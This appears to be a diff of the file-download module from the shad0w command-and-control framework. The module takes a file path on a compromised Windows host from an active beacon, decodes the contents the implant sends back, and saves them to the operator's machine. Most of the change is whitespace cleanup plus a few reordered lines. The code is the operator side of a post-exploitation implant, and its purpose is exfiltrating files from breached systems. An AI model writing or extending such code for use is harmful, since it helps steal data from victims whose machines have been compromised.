@@ -1,4 +1,4 @@
-# 
+#
 # Upload a file
 #
 
@@ -25,36 +25,43 @@ def error(message):
     ERROR = True
     error_list += f"\033[0;31m{message}\033[0m\n"
 
-def exit(status=0, message=None): 
+def exit(status=0, message=None):
     if message != None: print(message)
     return
 
 def download_callback(shad0w, data):
     global FILE_TO_DOWLOAD
 
+    shad0w.beacons[shad0w.current_beacon]["callback"] = None
+
+    FILE_TO_DOWLOAD = ''.join(FILE_TO_DOWLOAD)
+
+    shad0w.debug.good(f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)")
+
     # change to the dir of the folder mapped to the users current dir
     os.chdir("/root/shad0w/.bridge")
 
-    FILE_TO_DOWLOAD = ''.join(FILE_TO_DOWLOAD)
+    # os.unlink(FILE_TO_DOWLOAD)
+
     with open(FILE_TO_DOWLOAD, 'wb') as file:
         file.write(base64.b64decode(data))
-    
+
     # change the dir to our root
     os.chdir("/root/shad0w/")
 
-    shad0w.debug.good(f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)")
+    shad0w.debug.good(f"Downloaded")
 
     return ""
 
 
 def main(shad0w, args):
     global FILE_TO_DOWLOAD
-    
+
     # check we actually have a beacon
     if shad0w.current_beacon is None:
         shad0w.debug.error("ERROR: No active beacon")
         return
-    
+
     # usage examples
     usage_examples = """
 
@@ -67,7 +74,7 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
     parse = argparse.ArgumentParser(prog='download',
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog=usage_examples)
-    
+
     # keep it behaving nice
     parse.exit = exit
     parse.error = error
